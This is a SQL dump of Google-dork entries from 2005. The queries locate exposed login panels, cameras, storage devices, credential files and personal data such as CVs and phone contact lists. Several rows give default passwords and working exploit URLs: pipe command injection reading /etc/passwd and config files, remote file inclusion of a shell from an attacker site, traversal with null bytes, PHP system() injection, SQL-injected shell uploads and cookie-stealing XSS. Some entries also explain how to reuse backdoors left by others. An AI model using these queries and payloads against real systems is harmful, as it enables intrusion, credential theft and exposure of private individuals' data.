(1065, 'intitle:"Network Storage Link for USB 2.0 Disks" Firmware', 'http://www.google.com/search?q=intitle:Network%2BStorage%2BLink%2Bfor%2BUSB%2B2.0+Disks+intext:Disks+User+Log+in+(Private+Data)+++DISK+(Private+Data)+FLASH+(Public+Data)+Firmware+Version++&hl=en&hs=Yms&lr=&client=firefox-a&rls=org.mozilla:en-US:official&', 2337, '2005-08-12', 'Networked USB hard drives (NSLU2).  Be sure to disable Google''s filter (&amp;filters=0) as that is where they pop up. Default password (Linksys) is admin:admin (just like all the rest).  A majority are locked some are not.  Some logins to the NSLU2 will be a link off a website. Enjoy.', '2005-08-12', NULL, NULL),
(1066, 'intitle:"AlternC Desktop"', 'http://www.google.com/search?num=100&q=intitle%3A%22AlternC+Desktop%22', 1151, '2005-08-15', 'This finds the login page for AlternC Desktop I dont know what versions.', '2005-08-15', NULL, NULL),
(1067, 'intitle:"communigate pro * *" intitle:"entrance"', 'http://www.google.com/search?num=100&hl=en&lr=&safe=off&c2coff=1&q=intitle%3A%22communigate+pro+*+*%22+intitle%3A%22entrance%22&btnG=Search', 1134, '2005-08-11', 'Just reveals the login for Communigate Pro webmail. A brute force attack could be attempted. The directory link from this page can in some instances be used to query user information.', '2005-08-11', NULL, NULL),
(1068, '"inspanel" intitle:"login" -"cannot" "Login ID" -site:inspediumsoft.com', 'http://www.google.com/search?q=%22inspanel%22+intitle:%22login%22+-%22cannot%22+%22Login+ID%22+-site:inspediumsoft.com&num=100&hl=en&lr=&c2coff=1&safe=off&filter=0', 1212, '2005-08-15', 'This finds all versions of the inspanel login page.', '2005-08-15', NULL, NULL),
(1070, '"HostingAccelerator" intitle:"login" +"Username" -"news" -demo', 'http://www.google.com/search?q=%22HostingAccelerator%22+intitle:%22login%22+%2B%22Username%22+-%22news%22+-demo&num=100&hl=en&lr=&c2coff=1&safe=off&filter=0', 1164, '2005-08-14', 'This will find the login portal for HostingAccelerator ControlPanel I have not looked for exploits for these so i dont know if their are any. So far i have seen versions 1.9 2.2 and 2.4 found by this dork.', '2005-08-14', NULL, NULL),
(1071, 'intitle:"INTELLINET" intitle:"IP Camera Homepage"', 'http://www.google.com/search?q=intitle:%22INTELLINET%22+intitle:%22IP+Camera+Homepage%22&num=100&hl=en&lr=&c2coff=1&safe=off&filter=0', 2841, '2005-08-27', 'This googledork finds INTELLINET ip cameras.  They are used to monitor things and have a web interface.  Most of the pages load with the default username and password of guest.  The user manual says that the default admin username/password is admin/admin.  At the time of posting this googledork had 10 results.     p.s. This was discovered by jeffball55 and cleaned up by golfo', '2005-08-27', NULL, NULL),
(1072, '"Powered by Zorum 3.5"', 'http://www.google.com/search?hl=it&q=%22Powered+by+Zorum+3.5%22&meta=', 897, '2005-08-18', 'Zorum 3.5 remote code execution poc exploitsoftware:description: Zorum is a freely available, open source Web-based forumapplication implemented in PHP. It is available for UNIX, Linux, and any otherplatform that supports PHP script execution.author site: http://zorum.phpoutsourcing.com/1) remote code execution:vulnerable code, in /gorum/prod.php file:07  $doubleApp = isset($argv[1]);    ...14   if( $doubleApp )15   {16      $appDir = $argv[1];17      system("mkdir $prodDir/$appDir");   ...a user can execute arbitrary commands using pipe char, example:http://[target]/zorum/gorum/prod.php?argv[1]=|ls%20-lato list directorieshttp://[target]/zorum/gorum/prod.php?argv[1]=|cat%20../config.phpto see database username/password...http://[target]/zorum/gorum/prod.php?argv[1]=|cat%20/etc/passwdto see /etc/passwd file2) path disclosure:http://[target]/zorum/gorum/notification.phphttp://[target]/zorum/user.phphttp://[target]/zorum/attach.phphttp://[target]/zorum/blacklist.phphttp://[target]/zorum/forum.phphttp://[target]/zorum/globalstat.phphttp://[target]/zorum/gorum/trace.phphttp://[target]/zorum/gorum/badwords.phphttp://[target]/zorum/gorum/flood.phpand so on...googledork:"Powered by Zorum 3.5"rgodsite: http://rgod.altervista.orgmail: retrogod at aliceposta itoriginal advisory: http://rgod.altervista.org/zorum.html', '2005-08-18', NULL, NULL),
(1073, 'intitle:"xams 0.0.0..15 - Login"', 'http://www.google.com/search?hl=en&q=intitle%3A%22xams+0.0.0..15+-+Login%22&btnG=Google+Search', 1104, '2005-08-14', 'This is the login for xams it should catch from 0.0.1-0.0.150.0.15 being the latest version as far as I can see their is only versions 0.0.13 0.0.14 and 0.0.15', '2005-08-14', NULL, NULL),
(1074, 'intitle:"curriculum vitae" filetype:doc', 'http://www.google.com/search?hl=en&q=intitle%3A%22curriculum+vitae%22+filetype%3Adoc&btnG=Google+Search', 3951, '2005-08-12', 'Hello. 1. It reveals personal datas, often private addresses, phone numbers, e-mails, how many children one has:). Full curriculum vitae. I tried many verions of it:inurl:"pl" intitle:"curriculum vitae" filetype:docinurl:"uk" intitle:"curriculum vitae" filetype:docinurl:"nl" intitle:"curriculum vitae" filetype:doc, etc. in order to get national results,alsointitle:"curriculum vitae" ext:(doc | rtf )However filetype:doc version gives the most results. 2. You can always do someting with someone phone number, date and place of birth, etc. I placed this string in the forum, but nobody answered me :(. GreetingsphilYps. you have something similar in your GHDB, but different."Click here for the Google search ==&gt; "phone * * *" "address *" "e-mail" intitle:"curriculum vitae"(opens in new window)Added: Thursday, August 19, 2004hits: 24771"', '2005-08-12', NULL, NULL),
(1076, 'inurl:csCreatePro.cgi', 'http://www.google.com/search?hl=en&q=inurl%3AcsCreatePro.cgi&btnG=Google+Search', 1143, '2005-08-28', 'Create Pro logon pages.', '2005-08-28', NULL, NULL),
(1077, '"Powered by FUDForum 2.6" -site:fudforum.org -johnny.ihackstuff', 'http://www.google.com/search?num=100&hl=en&lr=&safe=off&c2coff=1&q=%22Powered+by+FUDForum+2.6%22+-site%3Afudforum.org+-johnny.ihackstuff&btnG=Search', 1173, '2005-08-30', 'FUDforum is prone to a remote arbitrary PHP file upload vulnerability.An attacker can merge an image file with a script file and upload it to an affected server.This issue can facilitate unauthorized remote access.FUDforum versions prior to 2.7.1 are reported to be affected. Currently Symantec cannot confirm if version 2.7.1 is affected as well.Affected versions:2.6.15 _ 2.6.14 _ 2.6.132.6.12 _ 2.6.10 _ 2.6.9 _ 2.6.82.6.7 _ 2.6.5 _ 2.6.4 _ 2.6.32.6.2 _ 2.6.1 _ 2.6', '2005-08-30', NULL, NULL),
(1078, 'intitle:"Looking Glass v20040427" "When verifying an URL check one of those"', 'http://www.google.com/search?q=intitle:%22Looking+Glass+v20040427%22+%22When+verifying+an+URL+check+one+of+those%22+&num=100&hl=en&lr=&c2coff=1&safe=off&filter=0', 827, '2005-09-19', 'Looking Glass v20040427 arbitrary commands execution / cross site scripting. description: Looking Glass is a pretty extensive web based network querying tool for use on php enabled servers.  site: http://de-neef.net/articles.php?id=2&amp;page=1download page: http://de-neef.net/download.php?file=2Read the full report here: http://rgod.altervista.org/lookingglass.html', '2005-09-19', NULL, NULL),
(1079, 'contacts ext:wml', 'http://www.google.com/search?hl=en&q=contacts+ext%3Awml+&btnG=Google+Search', 3007, '2005-08-23', 'Forget Bluetooth Hacking! You''ll be amazed, at how many people sync their Cell Phones to the same Computers they run some type of Server on. This Query literally gives you access to peoples private contact lists that are ether on there  Smart Phones'', or on their Windows CE wireless devices.An attacker could Spoof Emails with the "SIG" details of the persons Phone firmware, or simply collect the cellular numbers for something later on down the road.I even hypotheticlly came across some private text messages!', '2005-08-23', NULL, NULL),
(1080, 'intitle:"NetCam Live Image" -.edu -.gov -johnny.ihackstuff.com', 'http://www.google.com/search?q=intitle:%22NetCam+Live+Image%22+-.edu+-.gov+-johnny.ihackstuff.com&num=100&hl=en&lr=&c2coff=1&filter=0', 4249, '2005-09-06', 'This is a googledork for StarDot netcams.  You can watch these cams and if you have the admin password you can change configurations and other settings.  They have a default admin name/pass but I haven''t taken the time to figure it out.', '2005-09-06', NULL, NULL),
(1081, 'intitle:"Content Management System" "user name"|"password"|"admin" "Microsoft IE 5.5" -mambo -johnny.ihackstuff', 'http://www.google.com/search?q=intitle:%22Content+Management+System%22+%22user+name%22%7C%22password%22%7C%22admin%22+%22Microsoft+IE+5.5%22+-mambo+-johnny.ihackstuff&num=100&hl=en&lr=&c2coff=1&safe=off&filter=0', 1169, '2005-08-30', 'iCMS - Content Management System...Create websites without knowing HTML or web programming.', '2005-08-30', NULL, NULL),
(1082, 'phpLDAPadmin intitle:phpLDAPadmin filetype:php inurl:tree.php | inurl:login.php | inurl:donate.php (0.9.6 | 0.9.7)', 'http://www.google.com/search?q=phpLDAPadmin+intitle%3AphpLDAPadmin+filetype%3Aphp+inurl%3Atree.php+%7C+inurl%3Alogin.php+%7C+inurl%3Adonate.php+%280.9.6+%7C+0.9.7%29', 876, '2005-08-29', 'phpLDAPadmin 0.9.6 - 0.9.7/alpha5 (possibly prior versions) system disclosure,remote code execution, cross site scriptingsoftware:author site: http://phpldapadmin.sourceforge.net/description: phpLDAPadmin is a web-based LDAP client. It provides easy,anywhere-accessible, multi-language administration for your LDAP serverIf unpatched and vulnerable, a user can see any file on target system. A user can also execute arbitrary php code and system commands or craft a malicious url to include malicious client side code that will be executed in the security contest of the victim browser.', '2005-08-29', NULL, NULL),
(1083, '"powered by ITWorking"', 'http://www.google.com/search?num=100&hl=en&lr=&safe=off&c2coff=1&q=%22powered+by+ITWorking%22+-site%3Aihackstuff.com+-site%3Asecuritytracker.com+-forum+-hacker&btnG=Search', 904, '2005-08-21', 'saveWebPortal 3.4 remote code execution / admin check bypass / remote fileinclusion / cross site scripting author site: http://www.circeos.itdownload page: http://www.circeos.it/frontend/index.php?page=downloadsa) remote code execution:a user can bypass admin check, calling this url:http://[target]/saveweb/admin/PhpMyExplorer/editerfichier.php?chemin=.&amp;fichier=header.php&amp;type=Sourcenow can leave a backdoor in header.php or some other file, example:after editing template, user can execute arbitrary system commands, through aurl like this:http://[target]/saveweb/header.php?command=ls%20-lato list directories...http://[target]/saveweb/header.php?command=cat%20config.inc.phpto see database username/password and admin panel username/password (now attacker have full access to site configuration... can go tohttp://[target]/saveweb/admin/to login...)http://[target]/saveweb/header.php?command=cat%20/etc/passwdto see passwd file...b) arbitrary file inclusion:a user can view any file on the target server,if not with .php extension:http://[target]/saveweb/menu_dx.php?SITE_Path=../../../../../boot.ini%00http://[target]/saveweb/menu_sx.php?CONTENTS_Dir=../../../../../boot.ini%00can execute arbitrary file resident on target server, if with .php extension,example :http://[target]/saveweb/menu_dx.php?SITE_Path=../../../../../[script].php%00http://[target]/saveweb/menu_sx.php?CONTENTS_Dir=../../../../../[script].php%00can craft a malicious url to cause victim user to execute commands on externalsite:http://[target]/saveweb/menu_dx.php?SITE_Path=http://[external_site]/cmd.gif%00http://[target]/saveweb/menu_sx.php?CONTENTS_Dir=http://[external_site]/cmd.gif%00where cmd.gif is a file like this:c) xss:c.1)http://[target]/saveweb/footer.php?TABLE_Width=&gt;alert(document.cookie)http://[target]/saveweb/footer.php?SITE_Author_Domain=&gt;alert(document.cookie)http://[target]/saveweb/footer.php?SITE_Author=&gt;alert(document.cookie)http://[target]/saveweb/footer.php?L_Info=&gt;alert(document.cookie)http://[target]/saveweb/footer.php?L_Help=&gt;alert(document.cookie)http://[target]/saveweb/header.php?TABLE_Width=&gt;alert(document.cookie)http://[target]/saveweb/header.php?L_Visitors=&gt;alert(document.cookie)http://[target]/saveweb/header.php?count=&gt;alert(document.cookie)http://[target]/saveweb/header.php?SITE_Logo="&gt;alert(document.cookie)http://[target]/saveweb/header.php?BANNER_Url="&gt;alert(document.cookie)http://[target]/saveweb/header.php?L_Sunday="}alert(document.cookie)', '2005-08-21', NULL, NULL),
(1084, 'intitle:guestbook inurl:guestbook "powered by Advanced guestbook 2.*" "Sign the Guestbook"', 'http://www.google.com/search?q=intitle:guestbook+inurl:guestbook+%22powered+by++Advanced+guestbook+2.*%22+%22Sign+the+Guestbook%22&hl=en&lr=&c2coff=1&safe=off&filter=0', 6136, '2005-08-30', 'Advanced Guestbook is prone to an HTML injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in dynamically generated content.Attacker-supplied HTML and script code would be executed in the context of the affected Web site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.', '2005-08-30', NULL, NULL),
(1085, 'intext:"Master Account" "Domain Name" "Password" inurl:/cgi-bin/qmailadmin', 'http://www.google.com/search?q=intext:%22Master+Account%22++%22Domain+Name%22+%22Password%22+inurl:/cgi-bin/qmailadmin+&num=100&hl=en&lr=&c2coff=1&safe=off&filter=0', 1291, '2005-08-30', 'qmail mail admin login pages.There are several vulnerabilities relating to this software', '2005-08-30', NULL, NULL),
(1086, 'intitle:"web-cyradm"|"by Luc de Louw" "This is only for authorized users" -tar.gz -site:web-cyradm.org -johnny.ihackstuff', 'http://www.google.com/search?q=intitle:%22web-cyradm%22%7C%22by+Luc+de+Louw%22+%22This+is+only+for+authorized+users%22+-tar.gz+-site:web-cyradm.org+-johnny.ihackstuff&num=100&hl=en&lr=&c2coff=1&safe=off&filter=0', 1152, '2005-08-30', 'Web-cyradm is a software that glues topnotch mailing technologies together. The focus is on administrating small and large mailing environments.Web-cyradm is used by many different users. At the low end this are homeusers which are providing mailadresses to their family. On the mid to top end users are SME enterprises, educational and other organizations.The software on which web-cyradm relies on is completely free and opensource software. So you get the maximung flexibility which the lowest TCO.', '2005-08-30', NULL, NULL),
(1087, '"Powered by FUDForum 2.7" -site:fudforum.org -johnny.ihackstuff', 'http://www.google.com/search?num=100&hl=en&q=%22Powered+by+FUDForum+2.7%22+-site%3Afudforum.org+-johnny.ihackstuff&btnG=Search', 1203, '2005-08-30', 'FUDforum is prone to a remote arbitrary PHP file upload vulnerability.An attacker can merge an image file with a script file and upload it to an affected server.This issue can facilitate unauthorized remote access.FUDforum versions prior to 2.7.1 are reported to be affected. Currently Symantec cannot confirm if version 2.7.1 is affected as well.Affected versions:2.7', '2005-08-30', NULL, NULL),
(1088, '"You have requested to access the management functions" -.edu', 'http://www.google.com/search?q=%22You+have+requested+to+access+the+management+functions%22++-.edu&num=100&hl=en&lr=&c2coff=1&safe=off&filter=0', 1221, '2005-08-30', 'Terracotta web manager admin login portal.', '2005-08-30', NULL, NULL),
(1089, '"Please authenticate yourself to get access to the management interface"', 'http://www.google.com/search?num=100&q=%22Please+authenticate+yourself+to+get+access+to+the+management+interface%22&btnG=Search', 2034, '2005-08-30', 'Photo gallery managment system login', '2005-08-30', NULL, NULL),
(1090, 'ext:inc "pwd=" "UID="', 'http://www.google.com/search?hl=en&q=ext%3Ainc+%22pwd%3D%22+%22UID%3D%22&btnG=Google+Search', 2519, '2005-08-31', 'Database connection strings including passwords', '2005-08-31', NULL, NULL),
(1091, 'inurl:chitchat.php "choose graphic"', 'http://www.google.com/search?hl=it&q=inurl%3Achitchat.php+%22choose+graphic%22&btnG=Cerca+con+Google&meta=', 794, '2005-09-04', 'rgod advises:Cyber-Cats ChitCHat 2.0 permit cross site scripting attacks, let users launch exploits from, let remote users obtain informations on target users, let insecurely delete/create files. This search does not find vulnerable versions, only generic.software:site: http://www.cyber-cats.com/php/rgodsite: http://rgod.altervista.orgmail: retrogod@aliceposta.it[/code]', '2005-09-04', NULL, NULL),
(1092, '"Calendar programming by AppIdeas.com" filetype:php', 'http://www.google.com/search?hl=it&q=%22Calendar+programming+by+AppIdeas.com%22+filetype%3Aphp&btnG=Cerca+con+Google&meta=', 801, '2005-09-05', 'phpCommunityCalendar 4.0.3 (possibly prior versions) sql injection / login bypass / cross site scripting This search does not narrow to vulnerable versions.software:site: http://open.appideas.comdownload: http://open.appideas.com/Calendar/original advisory: http://rgod.altervista.org/phpccal.html', '2005-09-05', NULL, NULL),
(1093, '"Powered by MD-Pro" | "made with MD-Pro"', 'http://www.google.com/search?q=%22Powered+by+MD-Pro%22+%7C+%22made+with+MD-Pro%22&start=0&start=0', 786, '2005-09-05', 'MAXdev MD-Pro 1.0.73 (possibly prior versions) remote code execution/ cross site scripting / path disclosure. This search does not find vulnerable versions.software:site: http://www.maxdev.com/description: http://www.maxdev.com/AboutMD.phtmloriginal advisory: http://rgod.altervista.org/maxdev1073.html', '2005-09-05', NULL, NULL),
(1094, '"Software PBLang" 4.65 filetype:php', 'http://www.google.com/search?hl=en&lr=&c2coff=1&q=%22Software+PBLang%22+4.65+filetype%3Aphp', 828, '2005-09-07', 'my advisory:[quote]PBLang 4.65 (possibly prior versions) remote code execution / administrativecredentials disclosure / system information disclosure / cross site scripting /path disclosuresoftware:description: PBLang is a powerful flatfile Bulletin Board System. It combinesmany features of a professional board, but does not even require SQL support. Itis completely based on text-file.site: http://pblang.drmartinus.de/download: https://sourceforge.net/project/showfiles.php?group_id=629531) system disclosure:you can traverse directories and see any file (if not .php or .php3 etc.) andinclude any file on target system using ''../'' chars and null byte (%00), example:http://target]/[path]/pblang/setcookie.php?u=../../../../../etc/passwd%00vulnerable code in setcookie.php:   ...16 $usrname=$HTTP_GET_VARS[''u''];17 @include($dbpath.''/''.$usrname.''temp'');   ...2) remote code execution:board stores data in files, when you register a [username] file without extensionis created in /db/members directory, inside we have php code executed when youlogin, so in location field type:madrid"; system($HTTP_POST_VARS[cmd]); echo "in /db/members/[username] file we have...$userlocation="madrid"; system($HTTP_GET_VARS[cmd]); echo "";...no way to access the script directly, /db/members is .htaccess protectedand extra lines are deleted from files after you login, so you should makeall in a POST request and re-registerthis is my proof of concept exploit, to include [username] file I make a GET request of setcookie.php?u=[username]%00&amp;cmd=[command] but you can call username file through some other inclusion surely when you surf the forum:http://rgod.altervista.org/pblang465.html 3)admin/user credentials disclosure:you can see password hash of any user or admin sending the command:cat ./db/members/[username]4) cross site scripting:register and in location field type:madrid"; echo "alert(document.cookie)then check this url:http://[target]/[path]/setcookie.php?u=[username]%005) path disclosure:http://[target]/[path]/setcookie.php?u=%00googledork: "Software PBLang" filetype:phprgodsite: http://rgod.altervista.orgmail: retrogod@aliceposta.itoriginal advisory: http://rgod.altervista.org/pblang465.html[/quote]', '2005-09-07', NULL, NULL);
INSERT INTO `dorks` (`dork_id`, `title`, `link`, `hits`, `date`, `description`, `dateSubmission`, `vulnSoftVersion`, `exploitID`) VALUES
(1095, '"Powered by and copyright class-1" 0.24.4', 'http://www.google.com/search?hl=en&lr=&c2coff=1&q=%22Powered+by+and+copyright+class-1%22++0.24.4&num=50', 878, '2005-09-08', 'class-1 Forum Software v 0.24.4 Remote code executionsoftware: site: http://www.class1web.co.uk/softwaredescription: class-1 Forum Software is a PHP/MySQL driven web forum. It is written and distributedunder the GNU General Public License which means that its source is freely-distributedand available to the general public. vulnerability: the way the forum checks attachment extensions...look at the vulnerable code at viewforum.php 256-272 lines.nothing seems so strange, but... what happen if you try to upload a filewith this name? :shell.php.'' or ''a'' =''a;)[1] SQL INJECTION!The query and other queries like this become:SELECT * FROM [extensions table name] WHERE extension='''' or ''a'' =''a'' AND file_type=''Image''you have bypassed the check... now an executable file is uploaded, because for Apache, bothon Windows and Linux a file with that name is an executable php file...you can download a poc file from my site, at url:http://rgod.altervista.org/shell.zipinside we have:you can do test manually, unzip the file, register, login, post this file as attachment, thengo to this url to see the directory where the attachment has been uploaded:http://[target]/[path]/viewattach.phpyou will be redirected to:http://[target]/[path]/[upload_dir]/then launch commands:http://[target]/[path]/[upload_dir]/shell.php.''%20or%20''a''%20=''a?command=cat%20/etc/passwdto see /etc/passwd filehttp://[target]/[path]/[upload_dir]/shell.php.''%20or%20''a''%20=''a?command=cat%20./../db_config.incto see database username and passwordand so on...you can see my poc exploit at this url:http://www.rgod.altervista.org/class1.htmlgoogledork: "Powered by and copyright class-1"rgodsite: http://rgod.altervista.orgmail: retrogod [at] aliceposta . it', '2005-09-08', NULL, NULL),
(1096, '"Powered by Xcomic"', 'http://www.google.com/search?hl=it&q=%22Powered+by+Xcomic%22+&btnG=Cerca+con+Google&meta=', 4307, '2005-09-08', '"Powered by xcomic"this is a recent exploit, you can retrieve any file on target systemby using "../" chars and null byte (%00), example:http://target/path_to_xcomic/initialize.php?xcomicRootPath=../../../../etc/passwd%00or launch commands:http://target/path_to_xcomic/initiailze.php?xcomicRootPath=http://[evil_site]/cmd.gif?command=ls%20-la%00where cmd.gif is a file like this:I have read an advisory copy here: http://forum.ccteam.ru/archive/index.php/t-57.html', '2005-09-08', NULL, NULL),
(1097, 'rdbqds -site:.edu -site:.mil -site:.gov', 'http://www.google.com/search?hl=en&lr=&safe=off&c2coff=1&q=rdbqds+-site%3A.edu+-site%3A.mil+-site%3A.gov', 2098, '2005-09-08', 'Ceasar encryption is a rather simple encryption. You simply shift letters up or down across the entire length of the message... In the url I did this with the word "secret" which equals rdbqds.. (1 char shift).It appears that protected PDF documents use this very encryption to protect its documents. At least one version of adobe acrobat did. A big thank you to Golfo for the links he provided in the forum to assist.http://www.math.cankaya.edu.tr/~a.kabarcik/decrypt.html http://www.math.cankaya.edu.tr/~a.kabarcik/encrypt.html', '2005-09-08', NULL, NULL),
(1098, '"Warning:" "Cannot execute a blank command in"', 'http://www.google.com/search?hl=it&q=%22Warning%3A%22+%22Cannot+execute+a+blank+command+in%22&meta=', 4909, '2005-09-11', '"Warning: passthru(): Cannot execute a blank command in" "Warning: system(): Cannot execute a blank command in" "Warning: exec(): Cannot execute a blank command in" generally: "Warning:" "Cannot execute a blank command in" this a php error message, essentially it shows hacked pages links where someone leaved a backdoor and the page has error_reporting not set to 0... you can execute shell commands simply appending a var, guessing variable name, usually ''cmd'' or ''command'' or something else, example: http://[target]/[path]/somescript.php?cmd=cat%20/etc/passwd', '2005-09-11', NULL, NULL),
